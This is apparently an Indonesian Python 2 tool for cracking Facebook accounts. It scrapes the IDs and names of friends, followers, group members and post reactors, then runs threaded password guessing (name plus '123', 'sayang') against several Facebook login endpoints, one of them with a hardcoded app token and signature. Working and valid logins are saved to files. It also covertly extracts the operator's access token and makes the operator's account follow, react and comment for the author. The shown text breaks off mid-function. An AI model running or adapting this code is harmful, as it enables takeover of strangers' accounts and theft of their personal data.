# Author: IqbalDev
# Versi : 0.1
# Gausah Di Recode!
# Ga malu Ngerecode man?, Ga ada otak emang.

d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
k = "\033[93;1m"
b = "\033[94;1m"
j = "\033[95;1m"
a = "\033[96;1m"
p = "\033[97;1m"

import os
try:
	import concurrent.futures
except ImportError:
	print k+"\n Modul Futures blom terinstall!..."
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	from bs4 import BeautifulSoup
except ImportError:
	print k+"\n Modul bs4 blom terinstall!..."
	os.system("pip install bs4" if os.name == "nt" else "pip2 install bs4")
try:
	import requests
except ImportError:
	print k+"\n Modul Requests blom terinstall!..."
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")

import time, re, requests, sys, random, subprocess 
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from threading import Thread


folow = "https://graph.facebook.com/id_saya/subscribers?access_token="
fb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"

user = []
user_id = []
_user_1 = []
_user_2 = []
hasil_ok = []
hasil_cp = []
data_user = []

cari_teman = []
ttl_ = []
count_ = 0
garis = h+"+"+a+">>>--"+p

ipm = requests.get(url_ip).json()
ip = ipm["origin"]

def keluar():
	exit("\n Keluar..\n")

def clear_dev():
	os.system("cls" if os.name == "nt" else "clear")
def hapus_cokie():
	os.system("del cokie.txt" if os.name == "nt" else "rm -rf cokie.txt")
def hapus_data_login():
	os.system("del token.txt" if os.name == "nt" else "rm -rf token.txt")
	os.system("del cookie.txt" if os.name == "nt" else "rm -rf cookie.txt")

def jalankan_tool():
	os.system("premium.pyc" if os.name == "nt" else "python2 premium.pyc")

header = {"user-agent": "Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"}

def cek_hasil():
	print garis
	oke = []
	try:
		print h+" >_<"+p+" Hasil OK"+h+">>>"
		ok = open("hasil_ok.txt", "r").readlines()
		print ""
		with open("hasil_ok.txt", "w") as okeh:
			okeh.write("")
		for dev in set(ok):
			print "   "+h+dev.replace("\n", "")
			with open("hasil_ok.txt", "a") as okeh:
				okeh.write(dev)
			oke.append(dev)
		print p+"\n  >_ Jumlah OK: "+h+str(len(oke))
		oke = []
	except:
		print m+"\n   X "+p+"Blom ada hasil OK"
		pass
	print ""
	cpe = []
	try:

		print k+" >_<"+p+" Hasil CP"+k+">>>"
		cp = open("hasil_cp.txt", "r").readlines()
		print ""
		with open("hasil_cp.txt", "w") as cepe:
			cepe.write("")
		for dev in set(cp):
			print "   "+k+dev.replace("\n", "")
			with open("hasil_cp.txt", "a") as cepe:
				cepe.write(dev)
			cpe.append(dev)
		print p+"\n  >_ Jumlah CP: "+k+str(len(cpe))
		cpe = []
	except KeyboardInterrupt:
		print m+"\n   X "+p+"Blom ada hasil CP"
		pass
def __get_id__(user):
	global _id_user_
	url = "https://lookup-id.com/"
	if "facebook.com" in user:
		payload = {"fburl": user, "check": "Lookup"}
	else:
		payload = {"fburl": "https://free.facebook.com/"+user, "check": "Lookup"}
	with requests.Session() as ses_:
		halaman = ses_.post(url, data=payload, headers=header).text.encode("utf-8")
		sop_ = BeautifulSoup(halaman, "html.parser")
		email_ = sop_.find("span", id="code")
		if email_ == None:
			print m+" ID Tidak ditemukan!"
			exit()
		_id_user_ = email_.text


def __get_id__banyak__(user):
		url = "https://lookup-id.com/"
		payload = {"fburl": "https://free.facebook.com/"+user, "check": "Lookup"}
		with requests.Session() as ses_:
			halaman = ses_.post(url, data=payload, headers=header).text.encode("utf-8")
			sop_ = BeautifulSoup(halaman, "html.parser")
			email_ = sop_.find("span", id="code").text
			nama_ = sop_.find("em").text
			user_id.append(email_+" "+nama_)
			print h+"\r ["+p+"*"+h+"]"+p+" Mengambil ID"+k+": %s" % len(user_id),
			sys.stdout.flush()	

def proses_masuk(cookie_dev):

	with requests.Session() as ses_pros_dev:
		proses_masuk = ses_pros_dev.get("https://mbasic.facebook.com", cookies=cookie_dev).content
		sop = BeautifulSoup(proses_masuk, "html.parser")
		if "zero/optin/legal/" in str(proses_masuk):
			sop_gr = BeautifulSoup(proses_masuk, "html.parser").find("form")
			url_post = sop_gr["action"]
			payload = {}
			for dev in sop_gr:
				input = dev
				payload[input.get("name")] = input.get("value")
			ses_pros_dev.post("https://mbasic.facebook.com"+url_post, data=payload, cookies=cookie_dev)
	try:
		dev_sop = BeautifulSoup(proses_masuk, "html.parser")
		sop_uwu = dev_sop.find("a", string="Bahasa Indonesia")
		ambil_url = "https://mbasic.facebook.com"+sop_uwu["href"]
		has = ses_pros_dev.get(ambil_url, cookies=cookie_dev).content
						
	except:
		pass
	try:
		uwu_u = "https://mbasic.facebook.com/jangan.macem.macem.2"
		ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
		sop_dev = BeautifulSoup(ikut, "html.parser")
		ambil = sop_dev.find("a", string="Ikuti")
		data = "https://mbasic.facebook.com"+ambil["href"]
		ses_pros_dev.get(data, cookies=cookie_dev)
	except:
		pass

def love(cookie):
	url_love = "https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=510375576819453"
	with requests.Session() as r_dev:
		hal_love = r_dev.get(url_love, cookies=cookie).content
		sop = BeautifulSoup(hal_love, "html.parser")
		url_lov = sop.find_all("a")
		for iq in url_lov:
			if "(Hapus)" in str(iq):
				break
			if "Super" in str(iq):
				u_love = iq["href"]
				r_dev.get("https://mbasic.facebook.com"+u_love, cookies=cookie)

def komen(cookie):
	url = "https://mbasic.facebook.com/photo.php?fbid=510485606808450"
	for de in range(2):
		with requests.Session() as res_dev:
			hal_res = res_dev.get(url, cookies=cookie).content
			sop_dev = BeautifulSoup(hal_res, "html.parser")
			form = sop_dev.find("form")
			url_post = form["action"]
			tek = random.choice(["Good Job","Mantap bang", "Toolsnya Keren Bang", "Ga sia2 gw make Tool Abang, Mantap Betul..", "Ga ada obat emang, KEREN"])
			payload = {"comment_text": tek}
			for dev in form:
				input = dev
				payload[input.get("name")] = input.get("value")
			url_kom = "https://mbasic.facebook.com"+url_post
			komen = res_dev.post(url_kom, cookies=cookie, data=payload)

def __token__dev(cookie):
	with requests.Session() as ses_:
		free = ses_.get("https://free.facebook.com/", cookies=cookie).content
		sop_free = BeautifulSoup(free, "html.parser")
		link_lihat_poto = sop_free.find("a", string=" Lihat Foto ")
		if link_lihat_poto != None:
			ses_.get("https://free.facebook.com"+link_lihat_poto["href"], cookies=cookie)
		headerz = {
			# "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
			"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36",
			'referer' : 'https://m.facebook.com/',
			'host' : 'm.facebook.com',
			'origin' : 'https://m.facebook.com',
			'upgrade-insecure-requests' : '1',
			'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control' : 'max-age=0',
			'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'content-type' : 'text/html; charset=utf-8'
		}
		halaman = ses_.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers=headerz, cookies=cookie).text
		sop_ = BeautifulSoup(halaman, "html.parser")
		regex_token_dev = re.findall('accessToken(.*)useLocalFilePreview', str(sop_))
		token_dev = regex_token_dev[0].replace('\\":\\"', '').replace('\\",\\"', '')
		print "\n [*] "+p+"Token FB Kamu: "+d+token_dev
		with open("token.txt", "w") as tul:
			tul.write(token_dev)

def login_dengan_passwod():
	global fb, time
	try:
		
		print h+"\n\n      L O G I N  F A C E B O O K "
		print garis
		print p+"      IP Sekarang: "+k+ip
		print garis

		em_dev = raw_input(h+" ["+p+"Login"+h+"]"+p+" Masukkan Username:"+k+" ")
		san_dev = raw_input(h+" ["+p+"Login"+h+"]"+p+" Masukkan Password:"+d+" ")
		url_page_log = "https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr"
		with requests.Session() as ses_dev:
			page_dev = ses_dev.get(url_page_log).content
			sop = BeautifulSoup(page_dev, "html.parser")
			form_dev = sop.find("form", id="login_form")
			url_post = form_dev["action"]
			time = time.time()
			ses_dev.headers.update({
				"user-agent": "Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
				"referer": fb+url_post,
				"Host": "m.facebook.com",
				"accept": "*/*",
				"sec-ch-ua-mobile": "?1",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id,en-US;q=0.9,en;q=0.8",
				"x-fb-lsd": form_dev.find("input", attrs={"name": "lsd"})["value"]
				})
			payload = {
				"email": em_dev,
				"pass": "#PWD_BROWSER:0:{}:{}".format(int(time), san_dev)
			}
			for dev_get_input in form_dev:
				input = dev_get_input
				payload[input.get("name")] = input.get("value")
			
			login_dev = ses_dev.post(fb+url_post, data=payload, allow_redirects=False).cookies
			if "c_user" in login_dev:
				print p+"\n >_<"+h+" Login Sukses...\n"
				try:
					cokie_log = login_dev.get_dict()
					nilai_cok = cokie_log.values()
					for dev in nilai_cok:
						with open("cookie.txt", "a") as us_ps:
							us_ps.write(str(dev+"\n"))
					c_user = open("cookie.txt", "r").readlines()[0].strip("\n")
					fr = open("cookie.txt", "r").readlines()[1].strip("\n")
					xs = open("cookie.txt", "r").readlines()[2].strip("\n")
					sb = open("cookie.txt", "r").readlines()[3].strip("\n")
					cookie = {'c_user': c_user, 
							  'fr': fr, 
							  'xs': xs, 
							  'sb': sb}

				except:
					exit("\n Kesalahan di Cookie!\n")
				print h+"\n Login Sukses....\n Tunggu Proses"+p+"-------!!! "
				proses_masuk(cookie)
				love(cookie)
				komen(cookie)
				__token__dev(cokie_log)
				exit(p+"\n Jalankan lagi Toolsnya...!")

			elif "checkpoint" in login_dev:
				print k+"\n Akun Cekpoin..."
				exit("\n Keluar\n")
			else:
				print m+"\n Login Gagal..."
				exit("\n Keluar\n")
	except requests.exceptions.ConnectionError:
		print "\n Periksa Koneksi Internet!"
		exit("\n Keluar\n")

def login_dengan_cookie_():
	print ""
	print garis
	print p+"   L O G I N  D E N G A N "+h+" C O O K I E"
	print garis
	cok_in = raw_input(h+" ["+k+"coki"+h+"]"+p+" Masukkan Cookie"+k+": ")
	with open("cookie.txt", "w") as cookie_simpan:
		cookie_simpan.write(cok_in)

	file_cok = open("cookie.txt", "r").read()
	cookie = {"cookie": file_cok}

	with requests.Session() as ses_dev:
		login = ses_dev.get(fb, cookies=cookie).content

	if "mbasic_logout_button" in login:
		print h+"\n Login Sukses....\n Tunggu Proses"+p+"------!!! "
		proses_masuk(cookie)
		love(cookie)
		komen(cookie)
		__token__dev(cookie)
		exit(p+"\n Jalankan lagi Toolsnya...!")
	elif "checkpoint" in login:
		print k+"\n Akun Cekpoin"
		keluar()
	else:
		print m+"\n Cookie Salah"
		keluar()

def teman_teman_(token, user):

	try:
		with requests.Session() as ses_:
			nama = ses_.get("https://graph.facebook.com/{}?access_token={}".format(user,token)).json()
			print h+" ["+p+"*"+h+"]"+p+" Mengambil ID Teman"+h+": "+nama["name"]
			
		link = "https://graph.facebook.com/{}/friends?limit=5000&access_token={}".format(user,token)
		with requests.Session() as ses_:
			data = ses_.get(link).json()
			if len(data["data"]) == 0:
				print m+"\n [x] Tidak Bisa Mengakses Data: "+k+nama["name"]
				print m+" [x] Coba cari Akun yg lainnya!"
				exit()
			for dev in data["data"]:
			  	try:
					user_id.append(dev["id"]+" "+dev["name"])
					print h+"\r ["+p+"*"+h+"]"+p+" Mengambil ID"+k+": "+str(len(user_id)),
					sys.stdout.flush()
			  	except KeyboardInterrupt:
			  		break
			jm = len(user_id) / 2
			for dev in user_id:
				if len(_user_1) == jm:
					_user_2.append(dev)
					continue
				_user_1.append(dev)
				
			print ""

	except KeyError:
		print " Token Error.."
		login()

def teman(token):
	try:
		print h+" ["+p+"*"+h+"]"+p+" Tekan CTRL C untuk Berhenti!"
		url = "https://graph.facebook.com/me/friends?limit=5000&access_token={}".format(token)
		with requests.Session() as ses_:
			data = ses_.get(url).json()
			for dev in data["data"]:
				try:
					user_id.append(dev["id"]+" "+dev["name"])
					print h+"\r ["+p+"*"+h+"]"+p+" Mengambil ID Teman"+k+": "+str(len(user_id)),
					sys.stdout.flush()
				except KeyboardInterrupt:
					break
			jm = len(user_id) / 2
			for dev in user_id:
				if len(_user_1) == jm:
					_user_2.append(dev)
					continue
				_user_1.append(dev)
			print "\n"

	except KeyError:
		print " Token Error.."
		login()

def pengikut(token, user):
	try:
		with requests.Session() as ses_:
			nama = ses_.get("https://graph.facebook.com/{}?access_token={}".format(user,token)).json()
			print h+" ["+p+"*"+h+"]"+p+" Mengambil Data Followers"+h+": "+nama["name"]
		url = "https://graph.facebook.com/{}/subscribers?limit=999999&access_token={}".format(user, token)
		with requests.Session() as ses_:
			data = ses_.get(url).json()
			if len(data["data"]) == 0:
				print m+" [x] Tidak ada Pengikut.."
			for dev in data["data"]:
				try:
					user_id.append(dev["id"]+" "+dev["name"])
					print h+"\r ["+p+"*"+h+"]"+p+" Mengambil ID Followers"+k+": "+str(len(user_id)),
					sys.stdout.flush()
				except KeyboardInterrupt:
					break
			jm = len(user_id) / 2
			for dev in user_id:
				if len(_user_1) == jm:
					_user_2.append(dev)
					continue
				_user_1.append(dev)
			print ""
	except KeyboardInterrupt:
		print " KeyboardInterrupt.."


def likez(cookie, id_like):
	c =1
	url_like = "https://mbasic.facebook.com/ufi/reaction/profile/browser/fetch/?limit=10000&total_count=282&ft_ent_identifier={}".format(id_like)
	with requests.Session() as ses_dev:
		hal_like = ses_dev.get(url_like, cookies=cookie).content
		sop_dev = BeautifulSoup(hal_like, "html.parser")
	if "Orang yang menanggapi" not in str(hal_like):
		print "\n Maaf ID Tidak bisa dijangkau,\n Silahkan Masukkan ID Postingan yg Lain\n"
		likez()
	react = sop_dev.find_all("h3")
	for dev in react:
		for uwu in dev.find_all("a"):
			try:
				nama = uwu.text
				user = uwu["href"].replace("profile.php?id=", "").strip("/&?")
				# print c,"| {:<28}||  {}".format(nama,user)
				sys.stdout.write(h+"\r ["+k+"$"+h+"]"+p+" Mengambil User ID"+a+": "+str(c))
				user_id.append(user+" "+nama)
				c+=1
			except UnicodeEncodeError:
				continue

	jm = len(user_id) / 2
	for dev in user_id:
		if len(_user_1) == jm:
			_user_2.append(dev)
			continue
		_user_1.append(dev)
	print ""

c = 1
count = 0
def cari_orang(jumlah, u_orang, cookie):
	global c, count, data_user
	while jumlah>c:
		with requests.Session() as ses_dev:
			hal_orang = ses_dev.get(u_orang, cookies=cookie).text.encode("utf-8")
			sop_dev = BeautifulSoup(hal_orang, "html.parser")
			cari = sop_dev.find_all("tbody")
			for dev in cari:
				nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))
				us_ = re.findall('<a href="/(.*)?refid=46"><img alt="', str(dev))
				if len(us_) == 0:
					continue
				hasil = us_[0]
				hasil_nama = nama_[0]
				hasil_user = hasil.replace("profile.php?id=", "").replace("&amp;", "").strip("?&")
				data_user.append(hasil_user)

				if len(cari_teman) == 1:
					__get_id__(hasil_user)
					teman_teman_(token, _id_user_)
					sandi_dev()
					__pilih_crack__()
					print "\n",garis,p+"Done..."
					exit()

				c+=1
				if len(user_id) == jumlah+1:
					break

			with ThreadPoolExecutor(max_workers=30) as dev_x:
				dev_x.map(__get_id__banyak__,data_user)
				data_user = []
			if "Lihat Hasil Selanjutnya" in str(hal_orang):
				dev = sop_dev.find("a", string="Lihat Hasil Selanjutnya")
				u_orang = dev['href']
				cari_orang(jumlah, u_orang, cookie)
			with ThreadPoolExecutor(max_workers=30) as dev_x:
				dev_x.map(__get_id__banyak__,data_user)
				data_user = []

id_grup = []
def my_grup(token):
	url = "https://graph.facebook.com/me/groups?access_token={}".format(token)
	with requests.Session() as ses_:
		data = ses_.get(url).json()
		for dev in data["data"]:
			print h+" ["+p+"*"+h+"]"+p+" Nama Grup"+h+": "+dev["name"].encode("utf-8")
			print h+" ["+p+"*"+h+"]"+p+" ID Grup"+k+": "+dev["id"]
			print ""
			id_grup.append(dev["id"])

	print garis
	for dev in id_grup:
		url_grup = "https://mbasic.facebook.com/browse/group/members/?id={}".format(dev)
		grup(cookie, url_grup)

def grup(cookie, url_grup):
	global c
	with requests.Session() as ses_:
		try:
			data = ses_.get(url_grup, cookies=cookie, headers=header).content
			sop_dev = BeautifulSoup(data, "html.parser")
			members = sop_dev.find("div", id="objects_container")
			for dev in members.find_all("table"):
				user_ = dev["id"].replace("member_", "")
				nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
				data_user.append(user_+" "+nama_)
				print h+"\r ["+p+"*"+h+"]"+p+" Mengambil 100+ ID Per Grup"+k+": "+str(len(data_user)),
				sys.stdout.flush()
		
			if "Lihat Selengkapnya" in str(sop_dev):
				url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
				url_grup = "https://mbasic.facebook.com"+url
				grup(cookie, url_grup)
		except:
			pass


def __ttl__cp_(eml_dev, san_dev):
	try:
		token = open("token.txt").read()
		url = "https://graph.facebook.com/{}/?access_token={}".format(eml_dev, token)
		with requests.Session() as ses_:
			data = ses_.get(url).json()
			ttl = data["birthday"]
			print h+"\r{"+k+"Chek"+h+"}"+p+" {:<15}\033[92;1m | \033[90;1m{}\033[92;1m | \033[97;1m{}".format(eml_dev,san_dev,ttl)
			with open("hasil_cp.txt", "a") as hasil:
				hasil.write("[Chek] "+ eml_dev + " | " + san_dev +"\n")
			hasil_cp.append(eml_dev)
	except:
		pass

def crack_dev_api(iqbal_, dev___):
	global count_, ttl_

	print a+"\r>\033[92;1mCrack\033[96;1m->\033[97;1m{}\033[92;1m/\033[97;1m{}\033[96;1m|\033[92;1mLive\033[96;1m/\033[93;1mCek:\033[92;1m{}\033[96;1m/\033[93;1m{}".format(len(_user_1+_user_2),count_,len(hasil_ok),len(hasil_cp)),
	sys.stdout.flush()
	count_ +=1
	_id_ = iqbal_.split()
	eml_dev = _id_[0]
	for san_ in dev___:
			san_dev = san_.lower()
			parameter = {
			   'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
               'format': 'json', 
               'sdk_version': '2', 
               'email': eml_dev, 
               'locale': 'en_US', 
               'password': san_dev, 
               'sdk': 'ios', 
               'generate_session_cookies': '1', 
               'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'
               }
			api___ = 'https://b-api.facebook.com/method/auth.login'
			response = requests.get(api___, params=parameter)
			# print "===>",eml_dev,"|",san_dev
			if 'session_key' in response.text and 'EAAA' in response.text:
				print a+"\r{"+p+"Live"+a+"}"+h+" {:<15}\033[96;1m | \033[97;1m{}".format(eml_dev,san_dev)
				with open("hasil_ok.txt", "a") as hasil:
					hasil.write("[Live] "+ eml_dev + " | " + san_dev +"\n")
				hasil_ok.append(eml_dev)
				break
				
			elif 'www.facebook.com' in response.json()['error_msg']:
				if len(ttl_) == 1:
					__ttl__cp_(eml_dev, san_dev)
					break
					
				else:
					print h+"\r{"+k+"Chek"+h+"}"+p+" {:<15}\033[92;1m | \033[90;1m{}".format(eml_dev,san_dev)
					with open("hasil_cp.txt", "a") as hasil:
						hasil.write("[Chek] "+ eml_dev + " | " + san_dev +"\n")
					hasil_cp.append(eml_dev)
					break
				
			else:
				continue

def crack_dev(iqbal_, dev___):
  	global count_
	_id_ = iqbal_.split()
	eml_dev = _id_[0]
	print a+"\r>\033[92;1mCrack\033[96;1m->\033[97;1m{}\033[92;1m/\033[97;1m{}\033[96;1m|\033[92;1mLive\033[96;1m/\033[93;1mCek:\033[92;1m{}\033[96;1m/\033[93;1m{}".format(len(_user_1+_user_2),count_,len(hasil_ok),len(hasil_cp)),
	sys.stdout.flush()
	count_ +=1	

	for san_ in dev___:
	 	san_dev = san_.lower()
		url_page_log = "https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr"
		with requests.Session() as ses_dev:
			page_dev = ses_dev.get(url_page_log).content
			sop = BeautifulSoup(page_dev, "html.parser")
			form_dev = sop.find("form", id="login_form")
			url_post = form_dev["action"]
			waktu = time.time()
			user_agent = random.choice(["Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
										"Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
										"Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
										"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
										"Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
										"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
										"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36"])
			ses_dev.headers.update({
				"user-agent": user_agent,
				"referer": fb+url_post,
				"Host": "m.facebook.com",
				"accept": "*/*",
				"sec-ch-ua-mobile": "?1",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id,en-US;q=0.9,en;q=0.8",
				"x-fb-lsd": form_dev.find("input", attrs={"name": "lsd"})["value"]
				})
			payload = {
				"email": eml_dev,
				"pass": "#PWD_BROWSER:0:{}:{}".format(int(waktu), san_dev)
			}
			for dev_get_input in form_dev:
				input = dev_get_input
				payload[input.get("name")] = input.get("value")
			# print "===>",eml_dev," | ", san_dev
			login_dev = ses_dev.post(fb+url_post, data=payload, allow_redirects=False).cookies
			cookie = login_dev.get_dict()
			if "c_user" in login_dev:
				print a+"\r{"+p+"Live"+a+"}"+h+" {:<15}\033[96;1m | \033[97;1m{}".format(eml_dev,san_dev)
				with open("hasil_ok.txt", "a") as hasil:
					hasil.write("[Live] "+ eml_dev + " | " + san_dev +"\n")
				hasil_ok.append(eml_dev)
				proses_masuk(cookie)
				love(cookie)
				break
			elif "checkpoint" in login_dev:
				if len(ttl_) == 1:
					__ttl__cp_(eml_dev, san_dev)
					break
				else:
					print h+"\r{"+k+"Chek"+h+"}"+p+" {:<15}\033[92;1m | \033[90;1m{}".format(eml_dev,san_dev)
					with open("hasil_cp.txt", "a") as hasil:
						hasil.write("[Chek] "+ eml_dev + " | " + san_dev +"\n")
					hasil_cp.append(eml_dev)
					break
			else:
				continue

def crack_mobile(iqbal_, dev__):
	global count_
	_id_ = iqbal_.split()
	eml_dev = _id_[0]
	print a+"\r>\033[92;1mCrack\033[96;1m->\033[97;1m{}\033[92;1m/\033[97;1m{}\033[96;1m|\033[92;1mLive\033[96;1m/\033[93;1mCek:\033[92;1m{}\033[96;1m/\033[93;1m{}".format(len(_user_1+_user_2),count_,len(hasil_ok),len(hasil_cp)),
	sys.stdout.flush()
	count_ +=1
	for san__ in dev__: 
		san_dev = san__.lower()
		url = "https://m.facebook.com/login/?ref=dbl&fl"
		with requests.Session() as ses_dev:
			halaman = ses_dev.get(url).content
			sop = BeautifulSoup(halaman, "html.parser")
			form = sop.find("form", id="login_form")
			url_post = form["action"]
			wkt_dev = time.time()
			payload = {"email": eml_dev,"encpass": "#PWD_BROWSER:0:{}:{}".format(int(wkt_dev), san_dev)}
			for dev in form:
				input = dev
				payload[input.get("name")] = input.get("value")
			login = ses_dev.post("https://m.facebook.com"+url_post, data=payload, allow_redirects=False).cookies

			login_dev = login.get_dict()
			if "c_user" in login_dev:
				print a+"\r{"+p+"Live"+a+"}"+h+" {:<15}\033[96;1m | \033[97;1m{}".format(eml_dev,san_dev)
				with open("hasil_ok.txt", "a") as hasil:
					hasil.write("[Live] "+ eml_dev + " | " + san_dev +"\n")
				hasil_ok.append(eml_dev)
				proses_masuk(cookie)
				love(cookie)
				break
			elif "checkpoint" in login_dev:
				if len(ttl_) == 1:
					__ttl__cp_(eml_dev, san_dev)
					break
				else:
					print h+"\r{"+k+"Chek"+h+"}"+p+" {:<15}\033[92;1m | \033[90;1m{}".format(eml_dev,san_dev)
					with open("hasil_cp.txt", "a") as hasil:
						hasil.write("[Chek] "+ eml_dev + " | " + san_dev +"\n")
					hasil_cp.append(eml_dev)
					break
			else:
				continue

san_manual = []
def sandi_dev():
	san = raw_input(h+" ["+p+"?"+h+"]"+p+" Input Sandi Manual?"+d+"ENTER>Skip"+k+": ")
	san_ = san.split()
	for dev in san_:
		if len(dev) >= 6:
			san_manual.append(dev)
		elif len(dev) == 3 or len(dev) == 4 or len(dev) == 5:
			san_manual.append(dev+"123")

def crack_api():

		with ThreadPoolExecutor(max_workers=30) as c_dev:
			for data_ in _user_1+_user_2:
				try:
					set_ps = san_manual
					pw = data_.split()
					if len(san_manual) == 0:
						set_ps = ["sayang"]
				
					if len(pw[1]) >= 3:
						pas = [pw[1]+"123",pw[1]+"12345"]+set_ps
					else:
						if len(pw[1]) == 1:
							try:
								pas = [pw[1]+pw[2]+"123", pw[2]+"123", pw[1]+"12345"]+set_ps
							except:
								pass
						else:
							pass
					c_dev.submit(crack_dev_api, data_, pas)

				except:
					pass

def crack():

		with ThreadPoolExecutor(max_workers=30) as c_dev:
			for data_ in _user_1+_user_2:
				try:
					set_ps = san_manual
					pw = data_.split()
					if len(san_manual) == 0:
						set_ps = ["sayang"]

					if len(pw[1]) >= 3:
						pas = [pw[1]+"123",pw[1]+"12345"]+set_ps
					else:
						if len(pw[1]) == 1:
							try:
								pas = [pw[1]+pw[2]+"123", pw[2]+"123", pw[1]+"12345"]+set_ps
							except:
								pass
						else:
							pass
					c_dev.submit(crack_dev, data_, pas)

				except:
					pass
	

def crack_mobil():
		with ThreadPoolExecutor(max_workers=30) as c_dev:
			for data_ in _user_1+_user_2:
				try:
					set_ps = san_manual
					pw = data_.split()
					if len(san_manual) == 0:
						set_ps = ["sayang"]

					if len(pw[1]) >= 3:
						pas = [pw[1]+"123",pw[1]+"12345"]+set_ps
					else:
						if len(pw[1]) == 1:
							try:
								pas = [pw[1]+pw[2]+"123", pw[2]+"123", pw[1]+"12345"]+set_ps
							except:
								pass
						else:
							pass
					c_dev.submit(crack_mobile, data_, pas)

				except:
					pass

def __pilih_crack__():
	try:
		print garis
		print h+" ["+k+"1"+h+"]"+p+" Crack API facebook"+a+"("+p+"fast Cracking"+a+")"
		print h+" ["+k+"2"+h+"]"+p+" Crack"+a+" Login Instagram Lewat Facebook"+p+"("+h+"Pro"+p+")"
		print h+" ["+k+"3"+h+"]"+p+" Crack"+h+" Login Lewat facebook Mobile"
		print garis
		pilih = raw_input(p+" +>>>"+h+" ")
